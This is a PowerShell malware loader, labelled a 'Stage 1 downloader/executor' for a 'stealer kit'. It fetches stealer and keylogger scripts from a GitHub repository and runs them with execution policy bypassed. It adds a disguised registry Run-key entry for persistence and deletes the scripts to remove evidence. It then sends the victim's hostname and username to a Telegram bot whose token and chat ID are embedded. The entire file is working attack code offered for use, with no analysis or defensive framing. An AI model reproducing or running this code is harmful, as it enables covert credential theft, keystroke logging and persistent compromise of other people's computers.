# payload_final.ps1 — Stage 1 downloader/executor
# Downloads stealer.ps1, keylogger.ps1, executes them, sends SUCCESS to Telegram
# VISIBLE VERSION - no hidden windows, stays open for debugging

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$botToken = "8785045003:AAGsICsqOyT3t_luH2Y4WQSJ746dnbZZby4"
$chatId = "8445047233"
$repoBase = "https://raw.githubusercontent.com/isajarGamer2/stealer-repo/main"
$tempDir = "$env:TEMP\sysupdate_$(Get-Random -Maximum 9999)"
$logFile = "$env:TEMP\payload_debug.log"

function Write-Log {
    param([string]$Msg)
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    "$timestamp - $Msg" | Out-File -FilePath $logFile -Append -Encoding UTF8
    Write-Host $Msg
}

# Create working directory
New-Item -ItemType Directory -Path $tempDir -Force | Out-Null
Set-Location $tempDir

Write-Log "[*] Starting payload from $tempDir"
Write-Host ""
Write-Host "========================================" -ForegroundColor Cyan
Write-Host "  STEALER KIT - PAYLOAD EXECUTING" -ForegroundColor Cyan
Write-Host "========================================" -ForegroundColor Cyan
Write-Host ""

# Download components with cache-busting
$files = @("stealer.ps1", "keylogger.ps1")
foreach ($file in $files) {
    $url = "$repoBase/$file?v=$(Get-Random)"
    try {
        Invoke-WebRequest -Uri $url -UseBasicParsing -OutFile "$tempDir\$file" -ErrorAction Stop
        Write-Log "[+] Downloaded: $file"
        Write-Host "[+] Downloaded: $file" -ForegroundColor Green
    } catch {
        Write-Log "[-] Failed: $file - $($_.Exception.Message)"
        Write-Host "[-] Failed: $file - $($_.Exception.Message)" -ForegroundColor Red
        exit 1
    }
}

# Verify downloads
foreach ($file in $files) {
    if (-not (Test-Path "$tempDir\$file")) {
        Write-Log "[-] Missing: $file"
        Write-Host "[-] Missing: $file" -ForegroundColor Red
        exit 1
    }
    $size = (Get-Item "$tempDir\$file").Length
    Write-Log "[*] $file : $size bytes"
}

# Execute stealer — visible window so we can see errors
Write-Log "[*] Executing stealer.ps1..."
Write-Host "[*] Executing stealer.ps1..." -ForegroundColor Yellow
powershell.exe -ExecutionPolicy Bypass -File "$tempDir\stealer.ps1"
Write-Log "[*] stealer.ps1 finished"

# Execute keylogger in background
Write-Host "[*] Starting keylogger..." -ForegroundColor Yellow
Start-Job -ScriptBlock {
    param($path)
    powershell.exe -ExecutionPolicy Bypass -File $path
} -ArgumentList "$tempDir\keylogger.ps1" | Out-Null
Write-Log "[*] Keylogger started"

# Persistence - Registry Run key
$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$regName = "SysUpdate32"
$regValue = "powershell.exe -ExecutionPolicy Bypass -File `"$tempDir\stealer.ps1`""
try {
    Set-ItemProperty -Path $regPath -Name $regName -Value $regValue -Force
    Write-Log "[+] Persistence established: $regName"
    Write-Host "[+] Persistence established: $regName" -ForegroundColor Green
} catch {
    Write-Log "[-] Persistence failed: $($_.Exception.Message)"
}

# Cleanup evidence
Remove-Item "$tempDir\*.ps1" -Force -ErrorAction SilentlyContinue

# SUCCESS signal
Write-Host ""
Write-Host "========================================" -ForegroundColor Green
Write-Host "           SUCCESS" -ForegroundColor Green -BackgroundColor Black
Write-Host "========================================" -ForegroundColor Green
Write-Host ""
Write-Log "[*] SUCCESS displayed"

# Send success to Telegram with error reporting
$msg = "[+] PAYLOAD EXECUTED`nHost: $env:COMPUTERNAME`nUser: $env:USERNAME`nTime: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')"
try {
    Write-Log "[*] Sending Telegram message..."
    $response = Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/sendMessage" -Method Post -Body @{
        chat_id = $chatId
        text = $msg
    } -ErrorAction Stop
    Write-Log "[+] Telegram SUCCESS - Message ID: $($response.result.message_id)"
    Write-Host "[+] Telegram message sent!" -ForegroundColor Green
} catch {
    Write-Log "[-] Telegram FAILED: $($_.Exception.Message)"
    Write-Host "[-] Telegram FAILED: $($_.Exception.Message)" -ForegroundColor Red
    # Try alternative method
    try {
        $body = "chat_id=$chatId&text=$([Uri]::EscapeDataString($msg))"
        $wc = New-Object System.Net.WebClient
        $wc.Headers.add("Content-Type", "application/x-www-form-urlencoded")
        $result = $wc.UploadString("https://api.telegram.org/bot$botToken/sendMessage", $body)
        Write-Log "[+] Telegram via WebClient: $result"
        Write-Host "[+] Telegram sent via WebClient!" -ForegroundColor Green
    } catch {
        Write-Log "[-] Telegram WebClient FAILED: $($_.Exception.Message)"
        Write-Host "[-] Telegram WebClient FAILED" -ForegroundColor Red
    }
}

# Keep window open
Write-Host ""
Write-Host "[*] Press any key to close..." -ForegroundColor Yellow
$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
exit
